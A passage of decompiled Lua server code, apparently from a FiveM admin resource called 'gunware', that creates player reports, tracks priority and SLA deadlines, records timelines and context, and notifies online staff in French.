  end
  L2_2 = nil
  return L2_2
end
function L70_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  if A0_2 then
    L2_2 = tostring
    L3_2 = A0_2
    L2_2 = L2_2(L3_2)
    L3_2 = L2_2
    L2_2 = L2_2.lower
    L2_2 = L2_2(L3_2)
    if L2_2 then
      goto lbl_11
    end
  end
  L2_2 = nil
  ::lbl_11::
  L3_2 = tonumber
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if L2_2 then
    L4_2 = L65_1
    L4_2 = L4_2[L2_2]
    if L4_2 then
      L4_2 = L2_2
      L5_2 = L65_1
      L5_2 = L5_2[L2_2]
      return L4_2, L5_2
    end
  end
  if not L3_2 then
    L3_2 = 2
  end
  if L3_2 < 1 then
    L3_2 = 1
  end
  if L3_2 > 4 then
    L3_2 = 4
  end
  L4_2 = L64_1
  L4_2 = L4_2[L3_2]
  if not L4_2 then
    L4_2 = "normal"
  end
  L5_2 = L3_2
  return L4_2, L5_2
end
function L71_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L3_2 = tonumber
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  L4_2 = A2_2
  if A0_2 then
    L5_2 = tonumber
    L6_2 = A0_2.priority
    L5_2 = L5_2(L6_2)
    L3_2 = L5_2 or L3_2
    if not L5_2 then
    end
    L5_2 = A0_2.level
    L4_2 = L5_2 or L4_2
    if not L5_2 then
    end
  end
  L5_2 = L70_1
  L6_2 = L4_2
  L7_2 = L3_2
  L5_2, L6_2 = L5_2(L6_2, L7_2)
  L7_2 = L66_1
  L7_2 = L7_2[L5_2]
  if not L7_2 then
    L7_2 = L66_1.normal
  end
  L8_2 = L5_2
  L9_2 = L6_2
  L10_2 = L7_2
  return L8_2, L9_2, L10_2
end
function L72_1(A0_2)
  local L1_2, L2_2
  L1_2 = type
  L2_2 = A0_2.notes
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    L1_2 = {}
    A0_2.notes = L1_2
  end
  L1_2 = type
  L2_2 = A0_2.timeline
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    L1_2 = {}
    A0_2.timeline = L1_2
  end
  L1_2 = type
  L2_2 = A0_2.context
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    L1_2 = {}
    A0_2.context = L1_2
  end
  L1_2 = type
  L2_2 = A0_2.media
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    L1_2 = {}
    A0_2.media = L1_2
  end
end
function L73_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    return A0_2
  end
  L1_2 = L72_1
  L2_2 = A0_2
  L1_2(L2_2)
  L1_2 = A0_2.id
  if not L1_2 then
    L1_2 = uuid
    L1_2 = L1_2()
  end
  A0_2.id = L1_2
  L1_2 = tonumber
  L2_2 = A0_2.createdAtEpoch
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    L1_2 = os
    L1_2 = L1_2.time
    L1_2 = L1_2()
  end
  A0_2.createdAtEpoch = L1_2
  L1_2 = A0_2.createdAt
  if not L1_2 then
    L1_2 = A0_2.timestamp
    if not L1_2 then
      L1_2 = os
      L1_2 = L1_2.date
      L2_2 = "%Y-%m-%d %H:%M:%S"
      L3_2 = A0_2.createdAtEpoch
      L1_2 = L1_2(L2_2, L3_2)
    end
  end
  A0_2.createdAt = L1_2
  L1_2 = A0_2.timestamp
  if not L1_2 then
    L1_2 = A0_2.createdAt
  end
  A0_2.timestamp = L1_2
  L1_2 = tonumber
  L2_2 = A0_2.updatedAtEpoch
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    L1_2 = A0_2.createdAtEpoch
  end
  A0_2.updatedAtEpoch = L1_2
  L1_2 = A0_2.updatedAt
  if not L1_2 then
    L1_2 = A0_2.createdAt
  end
  A0_2.updatedAt = L1_2
  L1_2 = L70_1
  L2_2 = A0_2.priorityLevel
  L3_2 = A0_2.priority
  L1_2, L2_2 = L1_2(L2_2, L3_2)
  A0_2.priorityLevel = L1_2
  A0_2.priority = L2_2
  L3_2 = tonumber
  L4_2 = A0_2.slaTargetSec
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    L3_2 = L66_1
    L3_2 = L3_2[L1_2]
    if not L3_2 then
      L3_2 = L66_1.normal
    end
  end
  A0_2.slaTargetSec = L3_2
  L3_2 = tonumber
  L4_2 = A0_2.slaAlertStep
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    L3_2 = 0
  end
  A0_2.slaAlertStep = L3_2
  L3_2 = A0_2.screenshotUrl
  if not L3_2 then
    L3_2 = A0_2.media
    L3_2 = L3_2.screenshotUrl
  end
  A0_2.screenshotUrl = L3_2
  L3_2 = A0_2.screenshotUrl
  if L3_2 then
    L3_2 = A0_2.media
    L4_2 = A0_2.screenshotUrl
    L3_2.screenshotUrl = L4_2
  end
  return A0_2
end
function L74_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if not A0_2 then
    L1_2 = nil
    return L1_2
  end
  L1_2 = tostring
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  L2_2 = ipairs
  L3_2 = reportServer
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    if L7_2 then
      L8_2 = tostring
      L9_2 = L7_2.id
      L8_2 = L8_2(L9_2)
      if L8_2 == L1_2 then
        L8_2 = L73_1
        L9_2 = L7_2
        L8_2, L9_2 = L8_2(L9_2)
        return L8_2, L9_2
      end
    end
  end
  L2_2 = nil
  return L2_2
end
function L75_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = L73_1
  L2_2 = A0_2
  L1_2(L2_2)
  L1_2 = A0_2.status
  if "open" ~= L1_2 then
    L1_2 = "closed"
    L2_2 = 0
    L3_2 = A0_2.slaTargetSec
    return L1_2, L2_2, L3_2
  end
  L1_2 = math
  L1_2 = L1_2.max
  L2_2 = 0
  L3_2 = os
  L3_2 = L3_2.time
  L3_2 = L3_2()
  L4_2 = tonumber
  L5_2 = A0_2.createdAtEpoch
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    L4_2 = os
    L4_2 = L4_2.time
    L4_2 = L4_2()
  end
  L3_2 = L3_2 - L4_2
  L1_2 = L1_2(L2_2, L3_2)
  L2_2 = tonumber
  L3_2 = A0_2.slaTargetSec
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    L2_2 = L66_1.normal
  end
  L3_2 = L2_2 * 2
  if L1_2 >= L3_2 then
    L3_2 = "critical"
    L4_2 = L1_2
    L5_2 = L2_2
    return L3_2, L4_2, L5_2
  elseif L1_2 >= L2_2 then
    L3_2 = "breached"
    L4_2 = L1_2
    L5_2 = L2_2
    return L3_2, L4_2, L5_2
  end
  L3_2 = "ok"
  L4_2 = L1_2
  L5_2 = L2_2
  return L3_2, L4_2, L5_2
end
function L76_1(A0_2, A1_2, A2_2, A3_2, A4_2)
  local L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L5_2 = L73_1
  L6_2 = A0_2
  L5_2(L6_2)
  L5_2 = tonumber
  L6_2 = A2_2
  L5_2 = L5_2(L6_2)
  L6_2 = nil
  if L5_2 and L5_2 > 0 then
    L7_2 = GetPlayerName
    L8_2 = L5_2
    L7_2 = L7_2(L8_2)
    L6_2 = L7_2
  else
    L7_2 = type
    L8_2 = A2_2
    L7_2 = L7_2(L8_2)
    if "string" == L7_2 and "" ~= A2_2 then
      L6_2 = A2_2
    end
  end
  L7_2 = {}
  L8_2 = uuid
  L8_2 = L8_2()
  L7_2.id = L8_2
  L8_2 = A1_2 or L8_2
  if not A1_2 then
    L8_2 = "info"
  end
  L7_2.type = L8_2
  L8_2 = os
  L8_2 = L8_2.date
  L9_2 = "%Y-%m-%d %H:%M:%S"
  L8_2 = L8_2(L9_2)
  L7_2.at = L8_2
  L8_2 = os
  L8_2 = L8_2.time
  L8_2 = L8_2()
  L7_2.atEpoch = L8_2
  L7_2.actorId = L5_2
  L8_2 = L6_2 or L8_2
  if not L6_2 then
    L8_2 = "Syst\195\168me"
  end
  L7_2.actorName = L8_2
  L8_2 = tostring
  L9_2 = A3_2 or L9_2
  if not A3_2 then
    L9_2 = ""
  end
  L8_2 = L8_2(L9_2)
  L7_2.message = L8_2
  L8_2 = L68_1
  L9_2 = A4_2 or L9_2
  if not A4_2 then
    L9_2 = {}
  end
  L10_2 = 3
  L8_2 = L8_2(L9_2, L10_2)
  if not L8_2 then
    L8_2 = {}
  end
  L7_2.meta = L8_2
  L8_2 = table
  L8_2 = L8_2.insert
  L9_2 = A0_2.timeline
  L10_2 = L7_2
  L8_2(L9_2, L10_2)
  L8_2 = A0_2.timeline
  L8_2 = #L8_2
  if L8_2 > 120 then
    L8_2 = table
    L8_2 = L8_2.remove
    L9_2 = A0_2.timeline
    L10_2 = 1
    L8_2(L9_2, L10_2)
  end
  L8_2 = os
  L8_2 = L8_2.time
  L8_2 = L8_2()
  A0_2.updatedAtEpoch = L8_2
  L8_2 = os
  L8_2 = L8_2.date
  L9_2 = "%Y-%m-%d %H:%M:%S"
  L10_2 = A0_2.updatedAtEpoch
  L8_2 = L8_2(L9_2, L10_2)
  A0_2.updatedAt = L8_2
  return L7_2
end
function L77_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L1_2 = GetOnlineStaff
  L1_2 = L1_2()
  L2_2 = ipairs
  L3_2 = L1_2
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "gunware:report:updated"
    L10_2 = L7_2
    L11_2 = A0_2
    L8_2(L9_2, L10_2, L11_2)
  end
end
function L78_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L1_2 = GetOnlineStaff
  L1_2 = L1_2()
  L2_2 = ipairs
  L3_2 = L1_2
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "gunware:report:new"
    L10_2 = L7_2
    L11_2 = A0_2
    L8_2(L9_2, L10_2, L11_2)
  end
end
function L79_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = GetPlayerName
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  L2_2 = {}
  L3_2 = {}
  L4_2 = GetPlayerPing
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.ping = L4_2
  L4_2 = GetPlayerRoutingBucket
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.instance = L4_2
  L4_2 = GetPlayerEndpoint
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.endpoint = L4_2
  L2_2.server = L3_2
  L3_2 = {}
  L3_2.id = A0_2
  L4_2 = L1_2 or L4_2
  if not L1_2 then
    L4_2 = "ID "
    L5_2 = tostring
    L6_2 = A0_2
    L5_2 = L5_2(L6_2)
    L4_2 = L4_2 .. L5_2
  end
  L3_2.name = L4_2
  L4_2 = GetPlayerPing
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.ping = L4_2
  L4_2 = GetPlayerRoutingBucket
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.instance = L4_2
  L2_2.reporter = L3_2
  L3_2 = os
  L3_2 = L3_2.date
  L4_2 = "%Y-%m-%d %H:%M:%S"
  L3_2 = L3_2(L4_2)
  L2_2.capturedAtServer = L3_2
  return L2_2
end
function L80_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L2_2 = L68_1
  L3_2 = A0_2 or L3_2
  if not A0_2 then
    L3_2 = {}
  end
  L4_2 = 4
  L2_2 = L2_2(L3_2, L4_2)
  L3_2 = type
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  if "table" ~= L3_2 then
    L3_2 = {}
    L2_2 = L3_2
  end
  L3_2 = L2_2.server
  if not L3_2 then
    L3_2 = {}
  end
  L2_2.server = L3_2
  L3_2 = pairs
  L4_2 = A1_2.server
  if not L4_2 then
    L4_2 = {}
  end
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    L9_2 = L2_2.server
    L9_2[L7_2] = L8_2
  end
  L3_2 = L2_2.reporter
  if not L3_2 then
    L3_2 = {}
  end
  L2_2.reporter = L3_2
  L3_2 = pairs
  L4_2 = A1_2.reporter
  if not L4_2 then
    L4_2 = {}
  end
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    L9_2 = L2_2.reporter
    L9_2[L7_2] = L8_2
  end
  L3_2 = type
  L4_2 = L2_2.nearbyPlayers
  L3_2 = L3_2(L4_2)
  if "table" == L3_2 then
    L3_2 = {}
    L4_2 = 0
    L5_2 = ipairs
    L6_2 = L2_2.nearbyPlayers
    L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2)
    for L9_2, L10_2 in L5_2, L6_2, L7_2, L8_2 do
      L11_2 = type
      L12_2 = L10_2
      L11_2 = L11_2(L12_2)
      if "table" == L11_2 then
        L4_2 = L4_2 + 1
        if L4_2 > 12 then
          break
        end
        L11_2 = #L3_2
        L11_2 = L11_2 + 1
        L12_2 = {}
        L13_2 = tonumber
        L14_2 = L10_2.id
        L13_2 = L13_2(L14_2)
        if not L13_2 then
          L13_2 = nil
        end
        L12_2.id = L13_2
        L13_2 = tostring
        L14_2 = L10_2.name
        if not L14_2 then
          L14_2 = "Inconnu"
        end
        L13_2 = L13_2(L14_2)
        L14_2 = L13_2
        L13_2 = L13_2.sub
        L15_2 = 1
        L16_2 = 48
        L13_2 = L13_2(L14_2, L15_2, L16_2)
        L12_2.name = L13_2
        L13_2 = tonumber
        L14_2 = L10_2.distance
        L13_2 = L13_2(L14_2)
        if not L13_2 then
          L13_2 = 0.0
        end
        L12_2.distance = L13_2
        L13_2 = L10_2.isReported
        L13_2 = true == L13_2
        L12_2.isReported = L13_2
        L3_2[L11_2] = L12_2
      end
    end
    L2_2.nearbyPlayers = L3_2
  end
  L3_2 = A1_2.capturedAtServer
  if not L3_2 then
    L3_2 = L2_2.capturedAtServer
  end
  L2_2.capturedAtServer = L3_2
  return L2_2
end
function L81_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = {}
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if "table" ~= L2_2 then
    return L1_2
  end
  L2_2 = A0_2.target
  if L2_2 then
    L2_2 = tonumber
    L3_2 = A0_2.target
    L2_2 = L2_2(L3_2)
    if L2_2 and L2_2 > 0 then
      L1_2.targetId = L2_2
      L3_2 = GetPlayerName
      L4_2 = L2_2
      L3_2 = L3_2(L4_2)
      if not L3_2 then
        L3_2 = "ID "
        L4_2 = tostring
        L5_2 = L2_2
        L4_2 = L4_2(L5_2)
        L3_2 = L3_2 .. L4_2
      end
      L1_2.targetName = L3_2
    end
  end
  L2_2 = A0_2.extra
  if L2_2 then
    L2_2 = type
    L3_2 = A0_2.extra
    L2_2 = L2_2(L3_2)
    if "table" == L2_2 then
      L2_2 = L68_1
      L3_2 = A0_2.extra
      L4_2 = 2
      L2_2 = L2_2(L3_2, L4_2)
      L1_2.extra = L2_2
    end
  end
  return L1_2
end
function L82_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = L67_1
  L2_2 = L2_2[A0_2]
  if not L2_2 then
    L2_2 = "Action: "
    L3_2 = tostring
    L4_2 = A0_2 or L4_2
    if not A0_2 then
      L4_2 = "inconnue"
    end
    L3_2 = L3_2(L4_2)
    L2_2 = L2_2 .. L3_2
  end
  L3_2 = nil
  L4_2 = type
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  if "table" == L4_2 then
    L4_2 = A1_2.target
    if L4_2 then
      L4_2 = tonumber
      L5_2 = A1_2.target
      L4_2 = L4_2(L5_2)
      if L4_2 and L4_2 > 0 then
        L5_2 = GetPlayerName
        L6_2 = L4_2
        L5_2 = L5_2(L6_2)
        L3_2 = L5_2
      end
    end
  end
  if L3_2 and "" ~= L3_2 then
    L4_2 = "%s (%s)"
    L5_2 = L4_2
    L4_2 = L4_2.format
    L6_2 = L2_2
    L7_2 = L3_2
    return L4_2(L5_2, L6_2, L7_2)
  end
  return L2_2
end
L83_1 = _ENV
L84_1 = "CreateThread"
L83_1 = L83_1[L84_1]
function L84_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2
  while true do
    L0_2 = Wait
    L1_2 = 30000
    L0_2(L1_2)
    L0_2 = ipairs
    L1_2 = reportServer
    L0_2, L1_2, L2_2, L3_2 = L0_2(L1_2)
    for L4_2, L5_2 in L0_2, L1_2, L2_2, L3_2 do
      L6_2 = L73_1
      L7_2 = L5_2
      L6_2(L7_2)
      L6_2 = L5_2.status
      if "open" == L6_2 then
        L6_2 = L75_1
        L7_2 = L5_2
        L6_2, L7_2, L8_2 = L6_2(L7_2)
        L9_2 = tonumber
        L10_2 = L5_2.slaAlertStep
        L9_2 = L9_2(L10_2)
        if not L9_2 then
          L9_2 = 0
        end
        L10_2 = L9_2
        if "critical" == L6_2 then
          L10_2 = 2
        elseif "breached" == L6_2 then
          L11_2 = math
          L11_2 = L11_2.max
          L12_2 = L9_2
          L13_2 = 1
          L11_2 = L11_2(L12_2, L13_2)
          L10_2 = L11_2
        end
        L5_2.waitingSec = L7_2
        L5_2.slaStatus = L6_2
        if L9_2 < L10_2 then
          L5_2.slaAlertStep = L10_2
          if 2 == L10_2 then
            L11_2 = "SLA critique d\195\169pass\195\169"
            if L11_2 then
              goto lbl_47
            end
          end
          L11_2 = "SLA d\195\169pass\195\169"
          ::lbl_47::
          L12_2 = L76_1
          L13_2 = L5_2
          L14_2 = "sla_alert"
          L15_2 = "Syst\195\168me"
          L16_2 = L11_2
          L17_2 = {}
          L17_2.waitingSec = L7_2
          L17_2.slaTargetSec = L8_2
          L18_2 = L5_2.priorityLevel
          L17_2.priorityLevel = L18_2
          L12_2(L13_2, L14_2, L15_2, L16_2, L17_2)
          L12_2 = GetOnlineStaff
          L12_2 = L12_2()
          L13_2 = string
          L13_2 = L13_2.format
          L14_2 = "%s: report de %s en attente depuis %d min"
          L15_2 = L11_2
          L16_2 = L5_2.reporterName
          if not L16_2 then
            L16_2 = "Inconnu"
          end
          L17_2 = math
          L17_2 = L17_2.floor
          L18_2 = L7_2 / 60
          L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2 = L17_2(L18_2)
          L13_2 = L13_2(L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2)
          L14_2 = ipairs
          L15_2 = L12_2
          L14_2, L15_2, L16_2, L17_2 = L14_2(L15_2)
          for L18_2, L19_2 in L14_2, L15_2, L16_2, L17_2 do
            L20_2 = TriggerClientEvent
            L21_2 = "gunware:notif"
            L22_2 = L19_2
            if 2 == L10_2 then
              L23_2 = "error"
              if L23_2 then
                goto lbl_88
              end
            end
            L23_2 = "warning"
            ::lbl_88::
            L24_2 = L13_2
            L20_2(L21_2, L22_2, L23_2, L24_2)
          end
          L14_2 = L77_1
          L15_2 = L5_2
          L14_2(L15_2)
        end
      end
    end
  end
end
L83_1(L84_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:report:create"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:report:create"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2
  L1_2 = source
  L2_2 = GetPlayerName
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  L3_2 = type
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if "table" ~= L3_2 then
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = L1_2
    L6_2 = "error"
    L7_2 = "Donn\195\169es du report invalides."
    L3_2(L4_2, L5_2, L6_2, L7_2)
    return
  end
  L3_2 = tostring
  L4_2 = A0_2.message
  if not L4_2 then
    L4_2 = ""
  end
  L3_2 = L3_2(L4_2)
  L4_2 = L3_2
  L3_2 = L3_2.gsub
  L5_2 = "^%s+"
  L6_2 = ""
  L3_2 = L3_2(L4_2, L5_2, L6_2)
  L4_2 = L3_2
  L3_2 = L3_2.gsub
  L5_2 = "%s+$"
  L6_2 = ""
  L3_2 = L3_2(L4_2, L5_2, L6_2)
  if "" == L3_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = L1_2
    L7_2 = "error"
    L8_2 = "Le message du report ne peut pas \195\170tre vide."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    return
  end
  L4_2 = #L3_2
  L5_2 = 500
  if L4_2 > L5_2 then
    L5_2 = L3_2
    L4_2 = L3_2.sub
    L6_2 = 1
    L7_2 = 500
    L4_2 = L4_2(L5_2, L6_2, L7_2)
    L3_2 = L4_2
  end
  L4_2 = A0_2.category
  if L4_2 then
    L4_2 = A0_2.category
    L4_2 = L4_2.id
  end
  L5_2 = L69_1
  L6_2 = L4_2
  L5_2 = L5_2(L6_2)
  if not L5_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = L1_2
    L9_2 = "error"
    L10_2 = "Cat\195\169gorie invalide."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  L6_2 = ipairs
  L7_2 = reportServer
  L6_2, L7_2, L8_2, L9_2 = L6_2(L7_2)
  for L10_2, L11_2 in L6_2, L7_2, L8_2, L9_2 do
    L12_2 = L73_1
    L13_2 = L11_2
    L12_2(L13_2)
    L12_2 = L11_2.reporterId
    if L12_2 == L1_2 then
      L12_2 = L11_2.status
      if "closed" ~= L12_2 then
        L12_2 = TriggerClientEvent
        L13_2 = "gunware:notif"
        L14_2 = L1_2
        L15_2 = "error"
        L16_2 = "Vous avez d\195\169j\195\160 un report en cours. Attendez qu'il soit trait\195\169."
        L12_2(L13_2, L14_2, L15_2, L16_2)
        return
      end
    end
  end
  L6_2 = tonumber
  L7_2 = A0_2.reportedPlayerId
  L6_2 = L6_2(L7_2)
  if L6_2 and L6_2 <= 0 then
    L6_2 = nil
  end
  L7_2 = L71_1
  L8_2 = L5_2
  L9_2 = A0_2.priority
  L10_2 = A0_2.priorityLevel
  L7_2, L8_2, L9_2 = L7_2(L8_2, L9_2, L10_2)
  L10_2 = os
  L10_2 = L10_2.time
  L10_2 = L10_2()
  L11_2 = L80_1
  L12_2 = A0_2.context
  L13_2 = L79_1
  L14_2 = L1_2
  L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2 = L13_2(L14_2)
  L11_2 = L11_2(L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2)
  L12_2 = {}
  L13_2 = uuid
  L13_2 = L13_2()
  L12_2.id = L13_2
  L12_2.reporterId = L1_2
  L13_2 = L2_2 or L13_2
  if not L2_2 then
    L13_2 = "ID "
    L14_2 = tostring
    L15_2 = L1_2
    L14_2 = L14_2(L15_2)
    L13_2 = L13_2 .. L14_2
  end
  L12_2.reporterName = L13_2
  L12_2.reportedPlayerId = L6_2
  if L6_2 then
    L13_2 = GetPlayerName
    L14_2 = L6_2
    L13_2 = L13_2(L14_2)
    if L13_2 then
      goto lbl_134
    end
  end
  L13_2 = nil
  ::lbl_134::
  L12_2.reportedPlayerName = L13_2
  L13_2 = {}
  L14_2 = L5_2.id
  L13_2.id = L14_2
  L14_2 = L5_2.name
  L13_2.name = L14_2
  L14_2 = L5_2.color
  L13_2.color = L14_2
  L14_2 = L5_2.priority
  L13_2.priority = L14_2
  L14_2 = L5_2.level
  L13_2.level = L14_2
  L12_2.category = L13_2
  L12_2.message = L3_2
  L13_2 = os
  L13_2 = L13_2.date
  L14_2 = "%Y-%m-%d %H:%M:%S"
  L15_2 = L10_2
  L13_2 = L13_2(L14_2, L15_2)
  L12_2.timestamp = L13_2
  L13_2 = os
  L13_2 = L13_2.date
  L14_2 = "%Y-%m-%d %H:%M:%S"
  L15_2 = L10_2
  L13_2 = L13_2(L14_2, L15_2)
  L12_2.createdAt = L13_2
  L12_2.createdAtEpoch = L10_2
  L13_2 = os
  L13_2 = L13_2.date
  L14_2 = "%Y-%m-%d %H:%M:%S"
  L15_2 = L10_2
  L13_2 = L13_2(L14_2, L15_2)
  L12_2.updatedAt = L13_2
  L12_2.updatedAtEpoch = L10_2
  L12_2.status = "open"
  L12_2.takenBy = nil
  L12_2.takenByName = nil
  L12_2.takenAt = nil
  L12_2.takenAtEpoch = nil
  L12_2.closedBy = nil
  L12_2.closedByName = nil
  L12_2.closedAt = nil
  L12_2.closedAtEpoch = nil
  L12_2.closeReason = nil
  L12_2.closed = false
  L12_2.priority = L8_2
  L12_2.priorityLevel = L7_2
  L12_2.slaTargetSec = L9_2
  L12_2.slaStatus = "ok"
  L12_2.slaAlertStep = 0
  L12_2.waitingSec = 0
  L13_2 = {}
  L12_2.notes = L13_2
  L13_2 = {}
  L12_2.timeline = L13_2
  L12_2.context = L11_2
  L13_2 = {}
  L12_2.media = L13_2
  L12_2.screenshotUrl = nil
  L13_2 = L76_1
  L14_2 = L12_2
  L15_2 = "created"
  L16_2 = L1_2
  L17_2 = "Report cr\195\169\195\169"
  L18_2 = {}
  L19_2 = L12_2.category
  L19_2 = L19_2.name
  L18_2.category = L19_2
  L18_2.priorityLevel = L7_2
  L18_2.targetId = L6_2
  L13_2(L14_2, L15_2, L16_2, L17_2, L18_2)
  if L11_2 then
    L13_2 = next
    L14_2 = L11_2
    L13_2 = L13_2(L14_2)
    if L13_2 then
      L13_2 = L76_1
      L14_2 = L12_2
      L15_2 = "context"
      L16_2 = L1_2
      L17_2 = "Contexte auto captur\195\169"
      L18_2 = {}
      L13_2(L14_2, L15_2, L16_2, L17_2, L18_2)
    end
  end
  L13_2 = table
  L13_2 = L13_2.insert
  L14_2 = reportServer
  L15_2 = L12_2
  L13_2(L14_2, L15_2)
  L13_2 = L78_1
  L14_2 = L12_2
  L13_2(L14_2)
  L13_2 = TriggerClientEvent
  L14_2 = "gunware:notif"
  L15_2 = L1_2
  L16_2 = "success"
  L17_2 = "Votre report a \195\169t\195\169 envoy\195\169 avec succ\195\168s."
  L13_2(L14_2, L15_2, L16_2, L17_2)
  L13_2 = TriggerClientEvent
  L14_2 = "gunware:report:captureScreenshot"
  L15_2 = L1_2
  L16_2 = L12_2.id
  L13_2(L14_2, L15_2, L16_2)
  L13_2 = logAdminAction
  L14_2 = {}
  L14_2.action = "Nouveau Report"
  L14_2.playerName = L2_2
  L15_2 = string
  L15_2 = L15_2.format
  L16_2 = "Nouveau report de %s (%s | priorit\195\169 %s) - %s"
  L17_2 = L2_2 or L17_2
  if not L2_2 then
    L17_2 = "ID "
    L18_2 = tostring
    L19_2 = L1_2
    L18_2 = L18_2(L19_2)
    L17_2 = L17_2 .. L18_2
  end
  L18_2 = L5_2.name
  L19_2 = string
  L19_2 = L19_2.upper
  L20_2 = L7_2
  L19_2 = L19_2(L20_2)
  L20_2 = L3_2
  L15_2 = L15_2(L16_2, L17_2, L18_2, L19_2, L20_2)
  L14_2.description = L15_2
  L14_2.color = 255
  L14_2.webhook = "new_report"
  L14_2.reason = L3_2
  L13_2(L14_2)
  L13_2 = GetOnlineStaff
  L13_2 = L13_2()
  L14_2 = ipairs
  L15_2 = L13_2
  L14_2, L15_2, L16_2, L17_2 = L14_2(L15_2)
  for L18_2, L19_2 in L14_2, L15_2, L16_2, L17_2 do
    L20_2 = GetPlayerPing
    L21_2 = L19_2
    L20_2 = L20_2(L21_2)
    if L20_2 > 0 then
      L20_2 = TriggerClientEvent
      L21_2 = "gunware:notif"
      L22_2 = L19_2
      if "critical" == L7_2 then
        L23_2 = "error"
        if L23_2 then
          goto lbl_291
        end
      end
      L23_2 = "info"
      ::lbl_291::
      L24_2 = string
      L24_2 = L24_2.format
      L25_2 = "Nouveau report [%s] de %s (%s)"
      L26_2 = string
      L26_2 = L26_2.upper
      L27_2 = L7_2
      L26_2 = L26_2(L27_2)
      L27_2 = L2_2 or L27_2
      if not L2_2 then
        L27_2 = "ID "
        L28_2 = tostring
        L29_2 = L1_2
        L28_2 = L28_2(L29_2)
        L27_2 = L27_2 .. L28_2
      end
      L28_2 = L5_2.name
      L24_2, L25_2, L26_2, L27_2, L28_2, L29_2 = L24_2(L25_2, L26_2, L27_2, L28_2)
      L20_2(L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2)
    end
  end
end
